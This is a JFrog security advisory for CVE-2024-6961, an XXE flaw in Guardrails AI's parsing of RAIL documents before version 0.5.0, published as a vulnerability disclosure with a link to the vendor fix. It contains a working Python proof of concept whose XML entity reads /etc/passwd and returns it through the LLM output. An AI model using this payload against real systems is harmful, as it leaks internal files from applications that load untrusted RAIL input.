=== Content from research.jfrog.com_708e1587_20250110_110809.html ===

[![JFrog Security Research](/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg)](/)JFrog Security Research

* [Discover](/vulnerabilities/)
* [Follow JFrog Security
  ![twitter](/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg)](https://twitter.com/JFrogSecurity)
![Menu](/assets/static/hamburger.a58a0fd.dc5087fee70346d455e75c87bc430716.svg)![Menu](data:image/svg+xml...)![Menu](/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg)

* [Home](/)
* [Discover](/vulnerabilities/)
* [Follow JFrog Security](https://twitter.com/JFrogSecurity)
[< Back](/vulnerabilities/)
# JFSA-2024-001035519 - Guardrails RAIL XXE

CVE-2024-6961
| CVSS 5.9

 JFrog Severity:medium

Discovered By**Natan Nehorai**of the JFrog Security Research Team

Published 21 Jul, 2024 | Last updated 21 Jul, 2024

## [Summary](#summary)

XXE in Guardrails AI when consuming RAIL documents

## [Component](#component)

guardrails-ai

## [Affected versions](#affected-versions)

(,0.5.0)

## [Description](#description)

RAIL documents are an XML-based format invented by Guardrails AI to enforce formatting checks on LLM outputs. Guardrails users that consume RAIL documents from external sources are vulnerable to XXE, which may cause leakage of internal file data via the SYSTEM entity.

## [PoC](#poc)

```
import anthropic
import guardrails as gd
from litellm import litellm
import os

os.environ["ANTHROPIC_API_KEY"] = "put_here_your_secret_api_key"
API_KEY = os.environ["ANTHROPIC_API_KEY"]

## Assuming this RAIL document comes from an attacker
rail_str = """
<!--?xml version="0.1" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<rail version="0.1">

<output type="string" >
</output>

<prompt>
just write back what appears down here:
&xxe;
</prompt>
</rail>
"""

## Call the vulnerable API
guard = gd.Guard.from_rail_string(rail_str)

llm_output_unfiltered, validated_output, *rest = guard(
  llm_api=litellm.completion,
  model="claude-3-opus-20240229"
)

## The validated_output will contain the contents of /etc/passwd
print(validated_output)

```
## [Vulnerability Mitigations](#vulnerability-mitigations)

No mitigations are supplied for this issue

## [References](#references)

[Vendor fix](https://github.com/guardrails-ai/guardrails/pull/922)

[< Back](/vulnerabilities/)[![JFrog Security Research](/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg)](/)

* [Terms of Use](https://jfrog.com/terms-of-use/)
* [Cookies Policy](https://jfrog.com/jfrog-cookies-policy/)
* [Privacy Policy](https://jfrog.com/privacy-policy/)
* Cookies Settings

Â©2025 All Rights Reserved. JFrog Ltd.


